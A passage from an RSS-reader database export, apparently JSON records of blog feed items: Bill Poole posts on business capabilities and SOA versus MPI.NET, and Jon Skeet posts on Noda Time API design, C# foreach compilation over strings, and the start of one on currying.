itself. Hope you found it interesting though :)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1833608\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/vNRSrTLc02k\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1288}}
{"k":"0000000084","o":"0000006200","v":"001"}
{"_id":1289,"_uid":1289,"_dt":1373742620981,"_s":"9771dd35238236d8c225e1f641984d65"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/ClGOm_-tQag/business-capabilities.html","title":"Business Capabilities","published":{"$wrap":"$date","v":1215532080001,"h":"2008-07-08T15:48:00.001Z"},"starred":false,"read":false,"content":"In my<a href=\"http://bill-poole.blogspot.com/2008/07/service-contract-stability.html\">last post</a>, I mentioned that we can achieve very stable service contracts by aligning our service boundaries with business capabilities.  But this then begs the question, what is a business capability?  In short, a business capability is something that an organisation<i>does</i>that contributes in some way towards the overall function performed by the organisation.<br /><br />The advantage of business capabilities is their remarkable level of stability.  If we take a typical insurance organisation, it will likely have sales, marketing, policy administration, claims management, risk assessment, billing, payments, customer service, human resource management, rate management, document management, channel management, commissions management, compliance, IT support and human task management capabilities.  In fact, any insurance organisation will very likely have many of these capabilities.<br /><br />This means that any organisation operating within the same vertical industry will have a remarkably similar capability map.  This is a result of the fact that<i>what</i>these organisations do and the services they offer are fundamentally the same.  What differs from one organisation to the next is<i>how</i>these capabilities are implemented.<br /><br />That is, the business processes, applications, data, technologies and human resources (including their roles, skills and knowledge) that support each capability will differ from one organisation to the next; but the nature of the capabilities themselves, the value they deliver, and their core responsibilities will not vary.<br /><br />This means that whether a capability is implemented as a series of completely manual processes executed by employees, whether the capability is completely or partially outsourced, or whether the capability is fully automated with IT systems does not change the nature of the capability itself.  Other capabilities within the organisation are concerned only with the fact that the capability is performed, not<i>how</i>it is performed.<br /><br />As such we can change the implementation of a business capability without affecting any other capabilities supporting the organisation.  This makes for a considerably more stable business architecture description.  One problem commonly faced by business architects is that the organisation continues to change and adapt during the process of mapping out the business processes.<br /><br />This is in part due to the fact that process maps in a typical business architecture tend to span multiple business capabilities.  This significantly increases the number of process maps that contain implementation details of a single business capability.  Consequently when we change the implementation of a business capability, there is a larger number of process maps that need to be updated.<br /><br />By limiting the scope of our process maps to a single business capability, we substantially reduce the number of process maps affected by a change in the implementation of a capability.  As a result, our business architecture description is more stable and by extension more manageable.<br /><br />Business capabilities are hierarchical in nature.  We can decompose a business capability into smaller capabilities that support the broader capability.  We only decompose a capability into smaller capabilities where there is sufficient distinctiveness between those sub-capabilities to warrant separate and distinct process maps to describe those sub-capabilities.<br /><br />Of course there are business processes that span multiple business capabilities.  However, those processes are realised as event driven process chains.  Each business process that executes within a business capability has the ability to raise business relevant events.  Other business processes that execute within other capabilities subscribe to these events in order to trigger the execution of these processes.<br /><br />As such, end-to-end business processes are realised implicitly by virtue of the event publications and subscriptions between processes defined within each business capability.  Note that this notion of business event publication and subscription is not a technology concern.  It is simply a stable means of describing how business processes execute within an enterprise.<br /><br />Now, this is a really nice way of modelling a business architecture.  But what is the relevance to SOA?  Well, when we apply the SOA style of architecture to the business architecture domain we are concerned with<a href=\"http://bill-poole.blogspot.com/2008/06/business-services.html\">business services</a>.  A business service is modelled around a business capability that has an appropriate level of coupling and cohesion.<br /><br />If we choose a business capability that addresses too many unrelated concerns, then we will have low cohesion.  If we choose a business capability that is too finely grained, we will have tight coupling between services as related concerns will be distributed across multiple business services.<br /><br />So here we see that business capability mapping is an extremely valuable tool for deriving the business service model for an organisation.  It is important to note that this entire discussion falls within the business architecture domain.  The technical components that support a business service fall into the domain of the application and technology architecture.<br /><br />We find that the business service model is an incredibly valuable tool for achieving alignment between the business and IT domains.  This is because this single model has equal relevance in both domains.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/ClGOm_-tQag\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1289}}
{"k":"0000000084","o":"0000004017","v":"001"}
{"_id":1290,"_uid":1290,"_dt":1373742620981,"_s":"df9c85be2891dc368ef1dc348de8d315"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/inAj9YuVHoA/soa-eda-and-mpinet.html","title":"SOA, EDA and MPI.NET","published":{"$wrap":"$date","v":1222876260004,"h":"2008-10-01T15:51:00.004Z"},"starred":false,"read":false,"content":"I had another good<a href=\"https://www.blogger.com/comment.g?blogID=4338956765494283322&postID=7619190459401503391\">question</a>from Miguel, this time referring to my post on<a href=\"http://bill-poole.blogspot.com/2008/09/soa-and-eda.html\">SOA and EDA</a>where he asked whether distributed systems built using<a href=\"http://www.osl.iu.edu/research/mpi.net/\">MPI.NET</a>conform to the SOA or EDA style of architecture.<br /><br />MPI.NET is a platform for building a single distributed application where different parts of the application run on different nodes within a cluster of machines.  Often, the same program runs on different nodes, but takes on different roles on each node.  The role each program instance takes on each node can be determined by a unique rank assigned by the MPI environment to each MPI process.<br /><br />Messages can then be passed between different processes to coordinate their activities.  Often the program detects if it is rank zero and if so takes on the \"root\" responsibility, handing data and control messages to the other nodes, coordinating their activities and aggregating their results.<br /><br />The message exchange patterns offered by MPI.NET are<i>point-to-point</i>,<i>all-to-one</i>(gathering data),<i>one-to-all</i>(broadcast) and<i>all-to-all</i>.  These message exchange patterns differ from the message exchange pattern inherent to EDA, publish-subscribe.<br /><br />With publish-subscribe, systems subscribe to specific topics or topic specifications.  Messages published onto a given topic are routed to all subscribers that have subscribed to a matching topic specification.  Alternatively, subscriptions may be defined based on message content-based rules.<br /><br />With MPI.NET, there are no subscriptions as such.  Messages may be<i>broadcasted</i>to every node, which then decides whether the message is relevant.  This is a subtle difference, and perhaps one might argue it represents a highly simplified form of EDA.<br /><br />With regards to SOA, it is extremely bad practice for services to share the same business rules or data representation as it couples services too tightly.  The fundamental principle of MPI.NET is that the same logic can/will run on multiple nodes.  The purpose is quite different from SOA.<br /><br />With MPI.NET, you are distributing execution of the same logic across multiple servers for the purpose of increasing performance.  With SOA each service is responsible for its own logic, encapsulated behind its service boundary.<br /><br />Furthermore, the number of nodes allocated in an MPI.NET application is dynamic by design.  With SOA, each service has specific rules and responsibilities.  The number of services cannot be dynamically increased or decreased.<br /><br />Certainly<i>within</i>a service the number of nodes allocated to handle messages could be dynamically adjusted based on load.  However, these nodes are not directly addressable.  They are not visible to the consumers of the service.<br /><br />Another difference is that MPI.NET nodes do not have the concept of endpoints.  One cannot deliver messages to an MPI.NET node across a variety of different bindings via different endpoints.<br /><br />MPI.NET should be seen as a way to implementing a single service internally across multiple machines for the purpose of improving performance.<br /><br />I would say therefore that MPI.NET is not a platform for implementing SOA.  It could be considered as supporting the EDA style of architecture, but only in a very simplistic sense.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/inAj9YuVHoA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1290}}
{"k":"0000000084","o":"0000020737","v":"001"}
{"_id":1291,"_uid":1291,"_dt":1373742620981,"_s":"d1b26e9219b370101a4cf4195013b9aa"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/mW6QsW6GpVc/subtleties-in-api-design-member-placement.aspx","title":"Subtleties in API design - member placement","published":{"$wrap":"$date","v":1330536445000,"h":"2012-02-29T17:27:25.000Z"},"starred":false,"read":false,"content":"<p><a href=\"http://noda-time.googlecode.com\">Noda Time</a>is nearing v1.0, which means I'm spending more time writing documentation than code. It also means reviewing the APIs we've got with a critical eye - whether that's removing extraneous members, adding useful ones, or moving things around. (In particular, writing documentation often suggests where a change would make calling code read more naturally.)</p><p>This post is about one particular section of the API, and the choices available. Although I<em>do</em>go into some detail around the specific calls involved, that's just for context... the underlying choices are ones which could be faced when designing any API. I've rarely spent as much time thinking about API decisions as I have with Noda Time, so hopefully this will prove interesting to you even if you really don't care about Noda Time itself as a project.</p><h1>Introduction: time zones, local date/times and zoned date/times - oh my!</h1><p>(Okay, so that's not quite as snappy as<a href=\"http://youtu.be/peh61wd-53w?t=42s\">the Judy Garland version</a>, but hey...)</p><p>The area of API we're going to focus on is time zones, and converting between\"local\" date/time values and\"zoned\" ones. The three types involved are:</p><ul><li><strong>LocalDateTime</strong>: a\"local\" date and time, with no specific time zone. So, something like\"7:30 in the evening on February 27th 2012\". This means different instants in time in different time zones, of course: if you're arranging a meeting, it's good enough when the attendees are in the same time zone, but not good enough if you're meeting with someone on the other side of the world. (A LocalDateTime also has an associated calendar system, but I'm not going to talk about that much in this post.)</li><li><strong>DateTimeZone</strong>: a time zone. At its core, this maps<em>any</em>\"instant\" in time to an<em>offset</em>- the difference between UTC and local time in that time zone. The offset changes over time, typically (but not always) due to daylight saving changes.</li><li><strong>ZonedDateTime</strong>: a date and time in a particular time zone, with an offset from UTC to avoid ambiguity in some cases (and for efficiency). This identifies a specific instant in time (simply by subtracting the offset from the local date/time). Conceptually this is equivalent to just maintaining the\"instant\" value, the time zone, and the calendar system - but it's generally cleaner to think of it as a\"local\" value with an offset from UTC.</li></ul><p>If those brief descriptions don't make sense for you at the moment (this sort of thing is quite hard to describe concisely and precisely) you may want to see whether the Noda Time<a href=\"http://noda-time.googlecode.com/hg/docs/userguide/concepts.html\">user guide\"concepts\" page</a>helps.</p><h3>The API task: mapping from { LocalDateTime, DateTimeZone } to ZonedDateTime</h3><p>It's easy to get from a ZonedDateTime to a LocalDateTime - you can just use the LocalDateTime property. The difficult bit is the other way round. We obviously want to be able to create a ZonedDateTime from the combination of a LocalDateTime and a DateTimeZone, but the question is where to put this functionality. Three options suggest themselves:</p><ul><li>A static method (or constructor) in ZonedDateTime which takes both the time zone and the local date/time as arguments</li><li>An instance method on LocalDateTime which just takes the time zone as an argument</li><li>An instance method on DateTimeZone which just takes the local date/time as an argument</li></ul><p>It gets more complicated though - we're not really talking about<em>one</em>operation here, but potentially several. Although the mapping from instant to offset is unambiguous in DateTimeZone, the mapping from LocalDateTime to offset is<em>not</em>straightforward. There can be 0, 1 or 2 possible results. For example, in the America/Los_Angeles time zone the clocks go forward from 2am to 3am on Sunday March 11th 2012, and go back from 2am to 1am on Sunday 4th November 2012. That means:</p><ul><li>The mapping from local date/time to offset at 7.30pm on February 27th 2012 is unambiguous: it's definitely -8 hours (L.A. is 8 hours<em>behind</em>UTC).</li><li>The mapping at 2.30am on March 11th 2012 is<em>impossible</em>: at 2am the clocks were put forward to 3am, so 2.30am simply never occurs.</li><li>The mapping at 2.30am on November 4th 2012 is<em>ambiguous</em>: it happens once<em>before</em>the clocks go back at 3am, and once<em>afterwards</em>. The offset is either -7 or -8 hours, depending on which occurrence you mean.</li></ul><p>When mapping a local time to\"global\" time, this is something you should really think about. Most APIs obscure the issue, but one of the purposes of Noda Time is to<em>force</em>developers to think about issues which they should be aware of. This one is particularly insidious in that it's the kind of problem which is<em>much</em>more likely to arise when you're asleep than during daylight hours - so it's unlikely to be found during manual testing. (Ditto the day of week - most time zones have daylight saving transitions early on a Sunday morning.)</p><p>So, Noda Time exposes four ways of mapping a LocalDateTime and DateTimeZone to a ZonedDateTime:</p><ul><li>Exact: if there's a single mapping, return it. Otherwise, throw an exception.</li><li>Earlier: if there's a single mapping, return it. If there's more than one, return the earlier one. If the time is skipped, throw an exception.</li><li>Later: if there's a single mapping, return it. If there's more than one, return the later one. If the time is skipped, throw an exception.</li><li>All information: find out all the information relevant to mapping the given local value - how many matches there are, what they would be, what the time zone information is for each mapping, etc. The caller can then do what they want.</li></ul><h1>Options available</h1><p>The question is<em>how</em>we expose these operations. Let's look at some options, then discuss the pros and cons.</p><h3>Option 1: methods on LocalDateTime</h3><p>A lot of Noda Time is designed to be\"fluent\" so it makes a certain amount of sense to be able to take a LocalDateTime, perform some arithmetic on it, then convert it to a ZonedDateTime, then (say) format it. So we could have something like:</p><ul><li>var zoned = local.InZone(zone); // implicitly exact</li><li>var zoned = local.InZoneOrEarlier(zone);</li><li>var zoned = local.InZoneOrLater(zone);</li><li>var mapping = local.MapToZone(zone);</li></ul><h3>Option 2: methods on DateTimeZone</h3><p>All the calculations involved are really about the time zone - the local date/time value is just a simple value as far as most of this is concerned. So we can put the methods on DateTimeZone instead:</p><ul><li>var zoned = zone.AtExactly(local);</li><li>var zoned = zone.AtEarlier(local);</li><li>var zoned = zone.AtLater(local);</li><li>var mapping = zone.MapLocalDateTime(local);</li></ul><h3>Option 3: methods (or constructors) on ZonedDateTime</h3><p>Maybe we consider the two inputs to be fairly equal, but the result type is more important:</p><ul><li>var zoned = ZonedDateTime.FromLocal(zone, local);</li><li>var zoned = ZonedDateTime.FromLocalOrEarlier(zone, local);</li><li>var zoned = ZonedDateTime.FromLocalOrLater(zone, local);</li><li>var mapping = ZoneLocalMapping.FromLocal(local)</li></ul><p>(I'm not terribly happy about the names here; there could be better ones of course.)</p><h3>Variation a: any of the above options, but with an enum for ambiguity resolution</h3><p>We don't really need four methods on any of these APIs; the first three only differ by how they handle ambiguity (the situation where a particular local date/time occurs twice). We could use an enum to represent that choice instead:</p><ul><li>var zoned = local.InZone(zone, ZoneAmbiguityResolver.Error);</li><li>var zoned = local.InZone(zone, ZoneAmbiguityResolver.Earlier);</li><li>var zoned = local.InZone(zone, ZoneAmbiguityResolver.Later);</li></ul><p>(Or a\"smart enum\" with behaviour, if we wanted. A normal class type with methods etc, but only a restricted set of valid values.)</p><h3>Variation b: always go via the mapping result</h3><p>Given that we already have the idea of getting the full mapping results, we can reduce the API to just<em>one</em>method to return the mapping information, and then put extra methods on that:</p><ul><li>var zoned = local.MapInZone(zone).SingleMatch;</li><li>var zoned = local.MapInZone(zone).SingleOrEarlier;</li><li>var zoned = local.MapInZone(zone).SingleOrLater;</li></ul><p>(Again, the names aren't fixed in stone, and the second part could be methods instead of properties if we wanted.)</p><h3>Variation c: return a sequence of results</h3><p>If we return a sequence with 0, 1 or 2 ZonedDateTime values, the user can just use LINQ to get the one they want. Again, this can apply wherever we decide to put the method:</p><ul><li>var zoned = zone.At(local).Single();</li><li>var zoned = zone.At(local).First();</li><li>var zoned = zone.At(local).Last();</li></ul><p>So, it looks like we effectively have two mostly-orthogonal decisions here:</p><ul><li>Where to\"start\" the conversion - the target type for the method call</li><li>How to represent the multiple options</li></ul><p>We'll consider them separately.</p><h1>Regarding the\"source\" type</h1><p>To start with, I'll reveal my bias: the existing implementation is option 2 (four methods on DateTimeZone). This was after a small amount of debate on the Noda Time mailing list, and this was the most relevant bit of the discussion:</p><p>Me (<em>before</em>going with the current implementation):</p><blockquote><p>It feels a little odd to me to use the zone as the principal class here - just in terms of usability. It makes total sense in terms of the logic, but I tend to think of having a LocalDateTime first, and then converting<em>that</em>to use a particular zone - it's not an operation which feels like it acts on the zone itself.</p></blockquote><p>David N:</p><blockquote><p>I actually feel the opposite: asking a DateTimeZone how a particular LocalDateTime would be represented in that zone feels natural, while asking the LocalDateTime how it would be represented in a zone feels odd. The zone is a first-class entity, with identity and behavior; the LocalDateTime is just a set of values. Why would the LocalDateTime be expected to know how it is represented in a particular zone?</p></blockquote><p>Even though I replied to that in a\"maybe\" kind of tone, the argument basically convinced me. The trouble is, a colleague was then<em>surprised</em>when he read the documentation around calendar arithmetic and conversions. Surprising users is pretty much a cardinal sin when it comes to API design - and although in this case it was the relatively harmless sort of surprise (\"I can't find the member I want in A; oh, it turns out it's in B\") rather than a<em>behavioural</em>surprise (\"I thought it would do X, but instead it does Y\") it's still bad news. I should reveal my colleague's bias too - he has experience of<a href=\"http://joda-time.sourceforge.net/\">Joda Time</a>, where the relevant call is<a href=\"http://joda-time.sourceforge.net/api-release/org/joda/time/LocalDateTime.html#toDateTime(org.joda.time.DateTimeZone)\">LocalDateTime.toDateTime(DateTimeZone)</a>. (There<em>are</em>calls in DateTimeZone itself, but they're lower-level.)</p><p>We've discussed this a fair amount (leading to this blog post) and so far we've concluded that it really depends on how you<em>think</em>about time zones. As a Noda Time user, would you consider them to be rich objects with complex behaviour, or would you think of them as mere\"tokens\" to be passed around and used without much direct interaction? The two ways of viewing the type aren't necessarily in conflict - I've<em>deliberately</em>designed CalendarSystem to hide its (fairly ugly) innards. There are a few public instance members, but most are internal. But what about time zones?</p><p>There's an argument to be made for<em>educating</em>Noda Time users to think about time zones as more complex beasts than just tokens, and I'm happy to do that in other areas (such as choosing which type to use in the first place) but here it feels like it's one step too far. On the other hand, I don't want to stifle users who<em>are</em>thinking of DateTimeZone in that way. In the mailing list thread, David also expressed a dislike for the approach of including functionality in multiple places - and to a certain extent I agree (one of the things I<em>dislike</em>about its API is that it lets you do just about anything with anything)... but in this case it feels like it's justified.</p><p>Regardless of how you're thinking about DateTimeZone, it's more likely that you're going to want to<em>use</em>a LocalDateTime value which is the result of some other expression, and then apply some\"constant\" zone to it, then potentially keep going. If you think about a LINQ-style pipeline of operations, the part that varies in the conversion is much more likely to be the LocalDateTime than the time zone. As such, a method on LocalDateTime allows for a more fluent calling style:</p><div class=\"code\"><span class=\"Linq\">var</span>zoned = parseResult.Value<br />                       .PlusMonths(1)<br />                       .InZone(LondonTimeZone);</div><p>versus:</p><div class=\"code\"><span class=\"Linq\">var</span>zoned = LondonTimeZone.AtExactly(parseResult.Value.PlusMonths(1));</div><p>Or to keep the code order the same as the execution order:</p><div class=\"code\"><span class=\"Linq\">var</span>local = parseResult.Value.PlusMonths(1);<br /><span class=\"Linq\">var</span>zoned = LondonTimeZone.AtExactly(local);</div><p>Obviously the effects become more noticeable the more operations you perform. Personally I'm happy with either the first or third approach - although it's worth being aware that either of the first<em>two</em>have the advantage of being one expression, and therefore easy to use when assigning a static readonly field or something similar.</p><p>I'm<em>reasonably</em>happy with having one method on each type, or possibly two (MapLocalDateTime and At*) on DateTimeZone and one (just InZone) on LocalDateTime. I<em>really</em>don't like the idea of having four methods on DateTimeZone and three methods on LocalDateTime. So, let's consider the different variations which cut down the number of methods required.</p><p> </p><h1>Expressing\"exactly,\"\"earlier,\" and\"later\" in one method</h1><p>This is essentially a discussion of the\"variations\" above. Just to recap, the possibilities we've come up with are:</p><ul><li>Add another parameter to the method to indicate how to handle ambiguities (or impossibilities) - just return a ZonedDateTime</li><li>Return a value of a different type (e.g. ZoneLocalMapping) which can be used to get at all the information you could want</li><li>Return a sequence of possible ZonedDateTime values, expecting the caller to probably use LINQ's First/Last/Single/FirstOrDefault etc to get at the value they want</li></ul><p>The last of these is the only one which gives an easy way of handling the extreme corner case of a local time occurring<em>more</em>than twice - for example, a time zone which goes back one hour at 2am (to 1am) and then goes back another two hours at 3am. I think it's reasonable to dismiss this corner case; however mad time zones can be, I haven't seen anything<em>quite</em>that crazy yet.</p><p>At the time of the original discussion, Noda Time was targeting .NET 2.0, which was one reason for not going with the final option here - we couldn't guarantee that LINQ would be available. Now, Noda Time is targeting .NET 3.5 in order to use TimeZoneInfo, but it still doesn't feel like an ideal fit:</p><ul><li>Returning a sequence doesn't give information about (say) the two zone intervals\"surrounding\" a gap</li><li>A sequence may be surprising to users who expect just a single value</li><li>The exceptions thrown by First, Single etc when their expectations aren't met are very domain-neutral; we can give more information</li><li>FirstOrDefault will return the default value for ZonedDateTime in the case of ambiguity. That would be unfortunate, as ZonedDateTime is a value type, and its default value is actually somewhat unhelpful. (It has a null calendar system, effectively. There's not a lot we can do about this, but that's a post for another day.) We could make it a sequence of Nullable&lt;ZonedDateTime&gt; and guarantee that any values in it are actually non-null, but that's really straining things.</li></ul><p>Putting these together, there are enough negative points to this idea that I'm happy to rule it out. But what about the first two?</p><p>The first has the advantage that the caller only needs to make a single method call, effectively passing in a\"magic token\" (the ambiguity resolver) which they don't<em>really</em>need to understand. On the other hand, if they want more information, they'll have to call a different method - and I'm not really sure we want to encourage too much of this\"magic token\" behaviour.</p><p>The second has three disadvantages, all fairly slight:</p><ul><li>The user may initially expect the result of a method mapping a LocalDateTime to a ZonedDateTime to<em>be</em>a ZonedDateTime... what's this extra intermediate result doing? This is\"only\" a matter of user education, and it's pretty discoverable. It's an extra concept the user needs to understand, but it's a<em>good</em>concept to understand.</li><li>Calling two methods or a method and a property (e.g. zone.MapLocalDateTime(localDateTime).Earlier) may end up being slightly more long-winded than a single method call. I can't get excited about this.</li><li>We have to allocate an extra object for the mapping, even when we know it's unique. Usually, this object will become eligible for garbage collection immediately. We<em>could</em>make it a struct, but I don't think it's a natural value type - I'd rather trust that allocating objects in gen0 is pretty cheap.</li></ul><p>With the second method, we can replace<em>all</em>the existing methods in DateTimeZone with a single one (or rather, just remove the AtXyz methods, leaving MapLocalDateTime). We can then create pleasantly-named methods on ZoneLocalMapping (which isn't quite right for this purpose at the moment).</p><h1>Conclusion</h1><p>This has been an interesting thought experiment for me, and it's suggested some changes I<em>will</em>be applying before v1. We'll see how they pan out. If you want to follow them, look for relevant<a href=\"http://code.google.com/p/noda-time/source/list\">source code changes</a>.</p><p>The important points I've been thinking about are:</p><ul><li>What would a new user<em>expect</em>to be available? If they haven't read any documentation, what are they likely to try?</li><li>What<em>should</em>the user know about? Where there are important decisions to make, how can we provide guidance?</li><li>What would an<em>experienced</em>user (who is already thinking about the Noda Time concepts in the way that we want to encourage) expect to be available?</li><li>Where does the balance lie between providing a\"too crowded\" API (with lots of different ways of achieving the same thing) and a\"sparse\" API (where there's always one way of achieving a goal, but it may not be the most convenient one for your situation)</li><li>How does our choice fit in with other technologies? For example, the final\"variation\" seems like it plays nicely with LINQ at first - but a few subtleties make it a worse fit than it might seem.</li><li>How does this affect performance? (Performance is important in Noda Time - but there would have to be a<em>significant</em>performance problem for me to deviate from an elegant solution.)</li></ul><p>So, any other thoughts? Did we miss some options? What other factors should we have taken into consideration?</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1806600\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/mW6QsW6GpVc\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1291}}
{"k":"0000000084","o":"0000007154","v":"001"}
{"_id":1292,"_uid":1292,"_dt":1373742620982,"_s":"11eb9398d4707917010bf10809d8af3d"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/NYBtwDYJqsE/how-can-i-enumerate-thee-let-me-count-the-ways.aspx","title":"How can I enumerate thee? Let me count the ways...","published":{"$wrap":"$date","v":1349031501000,"h":"2012-09-30T18:58:21.000Z"},"starred":false,"read":false,"content":"<p>This weekend, I was writing some demo code for the async chapter of C# in Depth - the idea was to decompile a simple asynchronous method and see what happened. I received quite a surprise during this, in a way which had nothing to do with asynchrony.</p><p>Given that at execution time,<code>text</code>refers to an instance of<code>System.String</code>, and assuming nothing in the body of the loop captures the<code>ch</code>variable, how would you expect the following loop to be compiled?</p><div class=\"code\"><span class=\"Statement\">foreach</span>(<span class=\"ValueType\">char</span>ch<span class=\"Statement\">in</span>text)<br />{<br />   <span class=\"InlineComment\">// Body here</span><br />}</div><p>Before today, I could think of four answers depending on the compile-time type of<code>text</code>, assuming it compiled at all. One of those answers is if<code>text</code>is declared to be<code>dynamic</code>, which I'm not going to go into here. Let's stick with static typing.</p><h2>If<code>text</code>is declared as<code>IEnumerable</code>...</h2><p>In this case, the compiler can only use the non-generic<code>IEnumerator</code>interface, and I'd expect the code to be roughly equivalent to this:</p><div class=\"code\">IEnumerator iterator = text.GetEnumerator();<br /><span class=\"Statement\">try</span><br />{<br />   <span class=\"Statement\">while</span>(iterator.MoveNext())<br />    {<br />       <span class=\"ValueType\">char</span>ch = (<span class=\"ValueType\">char</span>) iterator.Current;<br />       <span class=\"InlineComment\">// Body here</span><br />    }<br />}<br /><span class=\"Statement\">finally</span><br />{<br />    IDisposable disposable = iterator<span class=\"Keyword\">as</span>IDisposable;<br />   <span class=\"Statement\">if</span>(disposable !=<span class=\"Keyword\">null</span>)<br />    { <br />        disposable.Dispose();<br />    }<br />}</div><p>Note how the disposal of the iterator has to be conditional, as<code>IEnumerator</code>doesn't extend<code>IDisposable</code>.</p><h2>If<code>text</code>is declared as<code>IEnumerable&lt;char&gt;</code>...</h2><p>Here, we don't need any execution time casting, and the disposal can be unconditional:</p><div class=\"code\">IEnumerator&lt;<span class=\"ValueType\">char</span>&gt; iterator = text.GetEnumerator();<br /><span class=\"Statement\">try</span><br />{<br />   <span class=\"Statement\">while</span>(iterator.MoveNext())<br />    {<br />       <span class=\"ValueType\">char</span>ch = iterator.Current;<br />       <span class=\"InlineComment\">// Body here</span><br />    }<br />}<br /><span class=\"Statement\">finally</span><br />{<br />    iterator.Dispose();<br />}</div><h2>If<code>text</code>is declared as<code>string</code>...</h2><p>Now things get interesting.<code>System.String</code>implements<code>IEnumerable&lt;char&gt;</code>using explicit interface implementation, and exposes a<a href=\"http://msdn.microsoft.com/en-us/library/system.string.getenumerator.aspx\">separate public<code>GetEnumerator()</code>method</a>which is declared to return a<a href=\"http://msdn.microsoft.com/en-us/library/system.charenumerator.aspx\"><code>CharEnumerator</code></a>.</p><p>Usually when I find a type doing this sort of thing, it's for the sake of efficiency, to reduce heap allocations. For example,<a href=\"http://msdn.microsoft.com/en-us/library/b0yss765.aspx\"><code>List&lt;T&gt;.GetEnumerator</code></a>returns a<a href=\"http://msdn.microsoft.com/en-us/library/x854yt9s.aspx\"><code>List&lt;T&gt;.Enumerator</code></a>which is<i>struct</i>with the appropriate iteration members. This means if you use<code>foreach</code>over an expression of type<code>List&lt;T&gt;</code>, the iterator can stay on the stack in most cases, saving object allocation and garbage collection.</p><p>In this case, however, I suspect<code>CharEnumerator</code>was introduced (way back in .NET 1.0) to avoid having to box each character in the string. This was one reason for<code>foreach</code>handling to be based on types obeying the enumerable pattern, as well as there being support through the normal interfaces. It strikes me that it could still have been a structure in the same way as for<code>List&lt;T&gt;</code>, but maybe that wasn't considered as an option.</p><p>Anyway, it means that I would have<i>expected</i>the code to be compiled like this, even back to C# 1:</p><div class=\"code\">CharEnumerator iterator = text.GetEnumerator();<br /><span class=\"Statement\">try</span><br />{<br />   <span class=\"Statement\">while</span>(iterator.MoveNext())<br />    {<br />       <span class=\"ValueType\">char</span>ch = iterator.Current;<br />       <span class=\"InlineComment\">// Body here</span><br />    }<br />}<br /><span class=\"Statement\">finally</span><br />{<br />    iterator.Dispose();<br />}</div><h2>What really happens when<code>text</code>is declared as<code>string</code>...</h2><p>(This is the bit that surprised me.)</p><p>So far, I've been assuming that the C# compiler doesn't have any special knowledge about strings, when it comes to iteration. I knew it did for arrays, but that's all. The<i>actual</i>result - under the C# 5 compiler, at least - is to use the<code>Length</code>property and the indexer directly:</p><div class=\"code\"><span class=\"ValueType\">int</span>index = 0;<br /><span class=\"Statement\">while</span>(index&lt; text.Length)<br />{<br />   <span class=\"ValueType\">char</span>ch = text[index];<br />    index++;<br />   <span class=\"InlineComment\">// Body here</span><br />}</div><p>There's no heap allocation, and no<code>Dispose</code>call. If the variable in question can change its value within the loop (e.g. if it's a field, or a captured variable, or there's an assignment to it within the body) then a copy is made of the variable value (just a reference, of course) first, so that all member access is performed on the same object.</p><h2>Conclusion</h2><p>So, there we go. There's nothing particularly mind-blowing here - certainly nothing to affect your programming style, unless you were deliberately avoiding using<code>foreach</code>on strings\"because it's slow.\" It's still a good lesson in not assuming you know what the compiler is going to do though... so long as the results are as expected, I'm very happy for them to put extra smarts in, even if it does mean having to change my C# in Depth sample code a bit...</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1817580\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/NYBtwDYJqsE\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1292}}
{"k":"0000000084","o":"0000014545","v":"001"}
{"_id":1293,"_uid":1293,"_dt":1373742620982,"_s":"6da9f0ba6bbeaef8d5fa73c09fe5148c"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/jeibq6H-CdU/currying-vs-partial-function-application.aspx","title":"Currying vs partial function application","published":{"$wrap":"$date","v":1327948326000,"h":"2012-01-30T18:32:06.000Z"},"starred":false,"read":false,"content":"<p>This is a slightly odd post, and before you read it you should probably put yourself into one of three buckets:</p><ul><li>Someone who doesn't care too much about functional programming, and finds higher order functions tricky: feel free to skip this post entirely.</li><li>Someone who knows all about functional programming, and already knows the difference between currying and partial function application: please read this post carefully and post comments about any inaccuracies you find. (Yes, the CAPTCHA is broken on Chrome; sorry.)</li><li>Someone who<em>doesn't</em>know much about functional programming yet, but is interested to learn more: please take this post with a pinch of salt, and read the comments carefully. Read other articles by more experienced developers for more information.</li></ul><p>Basically, I've been aware for a while that some people use the terms<em>currying</em>and<em>partial function application</em>somewhat interchangably, when they shouldn't. It's one of those topics (like monads) which I feel I understand to some extent, and I've decided that the best way of making sure I understand it is to try to write about it. If it helps the topic become more accessible to other developers, so much the better.</p><h3>This post contains no Haskell</h3><p>Almost every explanation I've ever seen of either topic has given examples in a\"proper\" functional language, typically Haskell. I have absolutely nothing against Haskell, but I typically find it easier to understand examples in a programming language I understand. I also find it<em>much</em>easier to<em>write</em>examples in a program language I understand, so all the examples in this post are going to be in C#. In fact, it's all available in a<a href=\"http://pobox.com/~skeet/csharp/blogfiles/Curry.cs\">single file</a>- that includes all of the examples, admittedly with a few variables renamed. Just compile and run.</p><p>C# isn't really a functional language - I know just about enough to understand that delegates aren't really a proper substitute for first class functions. However, they're good enough to demonstrate the principles involved.</p><p>While it's possible to demonstrate currying and partial function application using a 